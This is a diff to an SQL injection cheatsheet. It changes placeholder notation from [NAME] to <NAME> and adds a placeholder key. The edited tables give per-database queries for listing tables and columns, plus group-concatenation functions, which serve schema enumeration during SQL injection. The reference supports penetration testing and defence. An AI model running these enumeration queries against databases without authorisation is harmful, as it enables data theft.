@@ -5,6 +5,10 @@ title: "SQL Injection Cheatsheet"
 
 This is an SQL injection cheatsheet with tried and true payloads / techniques that cover the 5 most popular database variants and their derivatives (MySQL, PostgreSQL, MSSQL/SQL Server, Oracle, SQLite).
 
+## Key
+
+Some payloads contain placeholders which need to be replaced with specific values before they can be used. Placeholders are denoted with &lt;&gt; and are uppercase, for example &lt;START&gt;. Replace the entire placeholder (including &lt;&gt;).
+
 ## Pronunciation Guide
 
 How to pronounce "SQL" correctly. &#x1F60F;
@@ -351,7 +355,7 @@ These functions count the length of strings, either in terms of bytes or charact
 
 ## Group Concatenation
 
-These functions concatenate values from multiple rows of results into a single string.
+These functions concatenate values from multiple rows of results into a single string. Replace &lt;DELIMITER&gt; with the string/character you want separating each value (e.g. a comma).
 
 <table>
 <thead>
@@ -363,23 +367,23 @@ These functions concatenate values from multiple rows of results into a single s
 <tbody>
 <tr>
 <td class="span">MySQL</td>
-<td>GROUP_CONCAT(expression, &#x27;DELIMITER&#x27;)</td>
+<td>GROUP_CONCAT(expression, &#x27;&lt;DELIMITER&gt;&#x27;)</td>
 </tr>
 <tr>
 <td class="span">PostgreSQL</td>
-<td>STRING_AGG(expression, &#x27;DELIMITER&#x27;)</td>
+<td>STRING_AGG(expression, &#x27;&lt;DELIMITER&gt;&#x27;)</td>
 </tr>
 <tr>
 <td class="span">MSSQL</td>
-<td>STRING_AGG(expression, &#x27;DELIMITER&#x27;)</td>
+<td>STRING_AGG(expression, &#x27;&lt;DELIMITER&gt;&#x27;)</td>
 </tr>
 <tr>
 <td class="span">Oracle</td>
-<td>LISTAGG(expression, &#x27;DELIMITER&#x27;)</td>
+<td>LISTAGG(expression, &#x27;&lt;DELIMITER&gt;&#x27;)</td>
 </tr>
 <tr>
 <td class="span">SQLite</td>
-<td>GROUP_CONCAT(expression, &#x27;DELIMITER&#x27;)</td>
+<td>GROUP_CONCAT(expression, &#x27;&lt;DELIMITER&gt;&#x27;)</td>
 </tr>
 </tbody>
 </table>
@@ -627,28 +631,28 @@ Queries which return a list of all tables in a given database / schema.
 <tbody>
 <tr>
 <td rowspan="2" class="span">MySQL</td>
-<td>SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=&#x27;[DBNAME]&#x27;</td>
+<td>SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=&#x27;&lt;DBNAME&gt;&#x27;</td>
 </tr>
 <tr>
-<td>SELECT database_name,table_name FROM mysql.innodb_table_stats WHERE database_name=&#x27;[DBNAME]&#x27;</td>
+<td>SELECT database_name,table_name FROM mysql.innodb_table_stats WHERE database_name=&#x27;&lt;DBNAME&gt;&#x27;</td>
 </tr>
 <tr>
 <td rowspan="2" class="span">PostgreSQL</td>
-<td>SELECT tablename FROM pg_tables WHERE schemaname = &#x27;[SCHEMA_NAME]&#x27;</td>
+<td>SELECT tablename FROM pg_tables WHERE schemaname = &#x27;&lt;SCHEMA_NAME&gt;&#x27;</td>
 </tr>
 <tr>
-<td>SELECT table_name FROM information_schema.tables WHERE table_schema=&#x27;[SCHEMA_NAME]&#x27;</td>
+<td>SELECT table_name FROM information_schema.tables WHERE table_schema=&#x27;&lt;SCHEMA_NAME&gt;&#x27;</td>
 </tr>
 <tr>
 <td rowspan="2" class="span">MSSQL</td>
-<td>SELECT table_name FROM information_schema.tables WHERE table_catalog=&#x27;[DBNAME]&#x27;</td>
+<td>SELECT table_name FROM information_schema.tables WHERE table_catalog=&#x27;&lt;DBNAME&gt;&#x27;</td>
 </tr>
 <tr>
-<td>SELECT name FROM [DBNAME]..sysobjects WHERE xtype=&#x27;U&#x27;</td>
+<td>SELECT name FROM &lt;DBNAME&gt;..sysobjects WHERE xtype=&#x27;U&#x27;</td>
 </tr>
 <tr>
 <td class="span">Oracle</td>
-<td>SELECT OWNER,TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER=&#x27;[DBNAME]&#x27;</td>
+<td>SELECT OWNER,TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER=&#x27;&lt;DBNAME&gt;&#x27;</td>
 </tr>
 <tr>
 <td class="span">SQLite</td>
@@ -671,26 +675,26 @@ Queries which return a list of all columns in a given table & database / schema 
 <tbody>
 <tr>
 <td class="span">MySQL</td>
-<td>SELECT column_name,column_type FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=&#x27;[TABLE_NAME]&#x27; AND table_schema=&#x27;[DBNAME]&#x27;</td>
+<td>SELECT column_name,column_type FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=&#x27;&lt;TABLE_NAME&gt;&#x27; AND table_schema=&#x27;&lt;DBNAME&gt;&#x27;</td>
 </tr>
 <tr>
 <td class="span">PostgreSQL</td>
-<td>SELECT column_name,data_type FROM information_schema.columns WHERE table_schema=&#x27;[DBNAME]&#x27; AND table_name=&#x27;[TABLE_NAME]&#x27;</td>
+<td>SELECT column_name,data_type FROM information_schema.columns WHERE table_schema=&#x27;&lt;DBNAME&gt;&#x27; AND table_name=&#x27;&lt;TABLE_NAME&gt;&#x27;</td>
 </tr>
 <tr>
 <td class="span">MSSQL</td>
-<td>SELECT COL_NAME(OBJECT_ID(&#x27;[DBNAME].[TABLE_NAME]&#x27;), [INDEX])</td>
+<td>SELECT COL_NAME(OBJECT_ID(&#x27;&lt;DBNAME&gt;.&lt;TABLE_NAME&gt;&#x27;), &lt;INDEX&gt;)</td>
 </tr>
 <tr>
 <td class="span">Oracle</td>
-<td>SELECT COLUMN_NAME,DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME=&#x27;[TABLE_NAME]&#x27; AND OWNER=&#x27;[DBNAME]&#x27;</td>
+<td>SELECT COLUMN_NAME,DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME=&#x27;&lt;TABLE_NAME&gt;&#x27; AND OWNER=&#x27;&lt;DBNAME&gt;&#x27;</td>
 </tr>
 <tr>
 <td rowspan="2" class="span">SQLite</td>
-<td>SELECT MAX(sql) FROM sqlite_master WHERE tbl_name=&#x27;[TABLE_NAME]&#x27;</td>
+<td>SELECT MAX(sql) FROM sqlite_master WHERE tbl_name=&#x27;&lt;TABLE_NAME&gt;&#x27;</td>
 </tr>
 <tr>
-<td>SELECT name FROM PRAGMA_TABLE_INFO(&#x27;[TABLE_NAME]&#x27;)</td>
+<td>SELECT name FROM PRAGMA_TABLE_INFO(&#x27;&lt;TABLE_NAME&gt;&#x27;)</td>
 </tr>
 </tbody>
 </table>
